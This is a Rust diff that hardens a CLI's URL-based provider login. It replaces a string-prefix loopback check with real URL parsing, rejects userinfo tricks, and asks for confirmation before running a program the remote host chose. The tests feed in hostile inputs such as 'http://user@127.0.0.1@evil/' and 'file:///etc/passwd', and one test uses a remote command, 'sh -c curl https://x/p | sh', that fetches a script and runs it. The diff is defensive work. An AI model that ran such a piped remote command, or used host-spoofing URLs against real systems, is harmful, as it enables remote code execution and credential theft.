@@ -36,6 +36,7 @@ pub(super) fn execute(
             target,
             provider,
             method,
+            trust_remote_command,
         } => login(
             &store,
             env,
@@ -43,6 +44,7 @@ pub(super) fn execute(
             target.as_deref(),
             provider.as_deref(),
             method.as_deref(),
+            *trust_remote_command,
         ),
         ProvidersCommand::Logout { provider } => logout(&store, env, &layout, provider.as_deref()),
     }
@@ -128,7 +130,15 @@ fn login(
     target: Option<&str>,
     provider: Option<&str>,
     method: Option<&str>,
+    trust_remote_command: bool,
 ) -> Result<(), String> {
+    // The flag names a risk that only a URL login carries; accepting it anywhere else
+    // would let the help text and the behaviour disagree.
+    if trust_remote_command && !target.is_some_and(looks_like_url) {
+        return Err(format!(
+            "{TRUST_REMOTE_COMMAND_FLAG} applies only to a URL login; a provider login runs no remote-chosen command"
+        ));
+    }
     let requested = match (target, provider) {
         (Some(_), Some(_)) => {
             return Err("a positional provider cannot be combined with --provider".to_owned());
@@ -137,7 +147,7 @@ fn login(
             if method.is_some() {
                 return Err("URL login cannot be combined with --method".to_owned());
             }
-            return login_well_known(store, target);
+            return login_well_known(store, target, trust_remote_command);
         }
         (Some(target), None) => Some(target),
         (None, Some(provider)) => Some(provider),
@@ -779,15 +789,116 @@ struct WellKnownAuth {
 
 const WELL_KNOWN_PATH: &str = "/.well-known/zuno";
 
-fn login_well_known(store: &zuno_auth::AuthStore, raw_url: &str) -> Result<(), String> {
-    let url = raw_url.trim_end_matches('/');
-    if !(url.starts_with("https://") || url.starts_with("http://127.0.0.1")) {
-        return Err("well-known provider login requires HTTPS (or loopback HTTP)".to_owned());
+/// The flag that lets a URL login run the remote-chosen program unconfirmed.
+const TRUST_REMOTE_COMMAND_FLAG: &str = "--trust-remote-command";
+
+/// A well-known login destination after the URL has been parsed once.
+///
+/// Both the transport guard and the fetch read this value, never the raw argument,
+/// so the host that was checked is the host that is contacted.
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct WellKnownTarget {
+    /// The credential key: the parsed origin plus path, without a trailing slash,
+    /// query, or fragment.
+    provider: String,
+    /// The metadata document to fetch.
+    metadata_url: Url,
+}
+
+/// Parse and admit a well-known login URL.
+///
+/// Admitted: scheme `https`, or scheme `http` whose host is an IP address that is
+/// loopback (`127.0.0.1`, `[::1]`, any `127.0.0.0/8` address). Both require empty
+/// userinfo. Everything else is refused, including `http://localhost` (a name, not
+/// an address, so it resolves wherever the resolver says), `http://127.0.0.1.attacker.example`
+/// (a domain that merely starts with the loopback spelling), and
+/// `http://user@127.0.0.1@evil/` (userinfo that ends with the loopback spelling while
+/// the host is `evil`). The earlier string-prefix guard admitted the last two.
+fn well_known_target(raw_url: &str) -> Result<WellKnownTarget, String> {
+    let refused = |reason: &str| {
+        format!(
+            "well-known provider login requires an HTTPS URL, or plain HTTP to a loopback IP address such as http://127.0.0.1:8080; {raw_url:?} was refused because {reason}"
+        )
+    };
+    let mut url =
+        Url::parse(raw_url).map_err(|error| refused(&format!("it does not parse: {error}")))?;
+    if url.cannot_be_a_base() {
+        return Err(refused("it has no authority"));
+    }
+    if !url.username().is_empty() || url.password().is_some() {
+        return Err(refused("it carries userinfo, which can hide the real host"));
+    }
+    match url.scheme() {
+        "https" => {}
+        "http" => {
+            let loopback = match url.host() {
+                Some(url::Host::Ipv4(address)) => address.is_loopback(),
+                Some(url::Host::Ipv6(address)) => address.is_loopback(),
+                Some(url::Host::Domain(_)) | None => false,
+            };
+            if !loopback {
+                return Err(refused(
+                    "plain HTTP is allowed only when the host is a loopback IP address, not a name",
+                ));
+            }
+        }
+        other => return Err(refused(&format!("the scheme is {other:?}"))),
+    }
+    if url.host_str().is_none_or(str::is_empty) {
+        return Err(refused("it names no host"));
+    }
+    url.set_query(None);
+    url.set_fragment(None);
+    let base_path = url.path().trim_end_matches('/').to_owned();
+    let provider = url.as_str().trim_end_matches('/').to_owned();
+    let mut metadata_url = url;
+    metadata_url.set_path(&format!("{base_path}{WELL_KNOWN_PATH}"));
+    Ok(WellKnownTarget {
+        provider,
+        metadata_url,
+    })
+}
+
+/// Render the remote-chosen command so a person can judge it before it runs.
+///
+/// Every element is shown with `Debug` quoting, so an argument containing spaces,
+/// quotes, newlines, or control characters is visible as one argument rather than
+/// reading as several, and an empty argument is visible at all.
+fn describe_remote_command(provider: &str, program: &str, arguments: &[String]) -> String {
+    let mut text = format!(
+        "{provider} asks Zuno to run this program with your privileges to obtain a credential.\n  program: {program:?}\n  arguments ({}):",
+        arguments.len()
+    );
+    if arguments.is_empty() {
+        text.push_str(" none");
+    }
+    for argument in arguments {
+        text.push_str("\n    ");
+        text.push_str(&format!("{argument:?}"));
+    }
+    text.push_str("\nZuno did not choose this command; the remote host did.");
+    text
+}
+
+fn login_well_known(
+    store: &zuno_auth::AuthStore,
+    raw_url: &str,
+    trust_remote_command: bool,
+) -> Result<(), String> {
+    let target = well_known_target(raw_url)?;
+    let url = target.provider.as_str();
+    // Decide before the fetch whether a confirmation can happen at all. A pipe has
+    // nobody to answer the prompt, so without the explicit flag the login stops here:
+    // nothing is fetched, nothing is spawned, nothing is stored.
+    if !trust_remote_command && !terminal_prompt::is_interactive() {
+        return Err(format!(
+            "well-known provider login runs a program chosen by {url}, which requires an interactive terminal to confirm; rerun in a terminal, or pass {TRUST_REMOTE_COMMAND_FLAG} to run the remote-chosen command without confirmation on a host you already trust"
+        ));
     }
     let runtime = oauth_runtime()?;
     let metadata: WellKnown = runtime.block_on(async {
         zuno_network::client()
-            .get(format!("{url}{WELL_KNOWN_PATH}"))
+            .get(target.metadata_url.as_str())
             .send()
             .await
             .map_err(|error| format!("Failed to load auth provider metadata from {url}: {error}"))?
@@ -802,13 +913,24 @@ fn login_well_known(store: &zuno_auth::AuthStore, raw_url: &str) -> Result<(), S
         .command
         .split_first()
         .ok_or("auth provider metadata returned an empty command")?;
+    eprintln!("{}", describe_remote_command(url, program, arguments));
+    if trust_remote_command {
+        eprintln!(
+            "Running it without confirmation because {TRUST_REMOTE_COMMAND_FLAG} was passed."
+        );
+    } else if !terminal_prompt::confirm("Run this command")? {
+        return Err(
+            "well-known provider login cancelled; nothing was run and nothing was stored"
+                .to_owned(),
+        );
+    }
     let output = std::process::Command::new(program)
         .args(arguments)
         .output()
         .map_err(|error| format!("Failed to run auth provider command: {error}"))?;
     if !output.status.success() {
         return Err(format!(
-            "auth provider command exited with {}",
+            "auth provider command exited with {}; no credential was stored",
             output.status
         ));
     }
@@ -993,5 +1115,102 @@ mod tests {
         assert!(!looks_like_url("openai"));
         assert!(looks_like_url("https://provider.example.test"));
         assert!(looks_like_url("http://127.0.0.1:3000"));
+    }
+
+    /// M04: the transport guard used to be `starts_with("http://127.0.0.1")`, which
+    /// admitted every string that merely begins with the loopback spelling. These are
+    /// the audit's own inputs. Each refusal is asserted on the reason as well, so a
+    /// future guard that refuses for an incidental reason (a parse quirk, say) is
+    /// still caught if it stops refusing for the right one.
+    #[test]
+    fn a_hostname_that_starts_with_the_loopback_spelling_is_not_loopback() {
+        let error = well_known_target("http://127.0.0.1.attacker.example")
+            .expect_err("a domain under attacker.example must not pass as loopback");
+        assert!(error.contains("loopback IP address, not a name"), "{error}");
+
+        let error = well_known_target("http://127.0.0.1.attacker.example/.well-known/zuno")
+            .expect_err("the path does not change the host");
+        assert!(error.contains("loopback IP address, not a name"), "{error}");
+    }
+
+    #[test]
+    fn userinfo_that_ends_with_the_loopback_spelling_does_not_move_the_host() {
+        for url in [
+            "http://user@127.0.0.1@evil/",
+            "http://127.0.0.1@attacker.example/.well-known/zuno",
+            "https://127.0.0.1@attacker.example/",
+        ] {
+            let error = well_known_target(url).expect_err(url);
+            assert!(error.contains("userinfo"), "{url}: {error}");
+        }
+    }
+
+    #[test]
+    fn loopback_ip_addresses_over_plain_http_are_admitted_and_fetched_as_parsed() {
+        let target = well_known_target("http://127.0.0.1:8080/").expect("loopback with a port");
+        assert_eq!(target.provider, "http://127.0.0.1:8080");
+        assert_eq!(
+            target.metadata_url.as_str(),
+            "http://127.0.0.1:8080/.well-known/zuno"
+        );
+
+        let target = well_known_target("http://[::1]:3000").expect("IPv6 loopback");
+        assert_eq!(target.provider, "http://[::1]:3000");
+        assert_eq!(
+            target.metadata_url.as_str(),
+            "http://[::1]:3000/.well-known/zuno"
+        );
+
+        let target = well_known_target("http://127.0.0.1:3000/gateway/?x=1#frag")
+            .expect("a base path is kept, the query and fragment are not");
+        assert_eq!(target.provider, "http://127.0.0.1:3000/gateway");
+        assert_eq!(
+            target.metadata_url.as_str(),
+            "http://127.0.0.1:3000/gateway/.well-known/zuno"
+        );
+    }
+
+    #[test]
+    fn https_is_admitted_for_any_host_and_every_other_scheme_is_refused() {
+        let target = well_known_target("https://gateway.example.test").expect("https");
+        assert_eq!(target.provider, "https://gateway.example.test");
+        assert_eq!(
+            target.metadata_url.as_str(),
+            "https://gateway.example.test/.well-known/zuno"
+        );
+
+        for url in [
+            "http://localhost:3000",
+            "http://gateway.example.test",
+            "http://[::ffff:127.0.0.1]/",
+            "http://10.0.0.1/",
+            "ftp://127.0.0.1/",
+            "file:///etc/passwd",
+            "not a url",
+        ] {
+            assert!(well_known_target(url).is_err(), "{url} must be refused");
+        }
+    }
+
+    #[test]
+    fn the_remote_command_is_shown_one_argument_per_line_with_quoting() {
+        let shown = describe_remote_command(
+            "https://gateway.example.test",
+            "sh",
+            &[
+                "-c".to_owned(),
+                "curl https://x/p | sh".to_owned(),
+                String::new(),
+            ],
+        );
+        assert!(shown.contains("program: \"sh\""), "{shown}");
+        assert!(shown.contains("arguments (3):"), "{shown}");
+        assert!(shown.contains("\n    \"-c\"\n"), "{shown}");
+        assert!(shown.contains("\"curl https://x/p | sh\""), "{shown}");
+        assert!(
+            shown.contains("\n    \"\"\n"),
+            "the empty argument must be visible: {shown}"
+        );
+        assert!(shown.contains("the remote host did"), "{shown}");
     }
 }
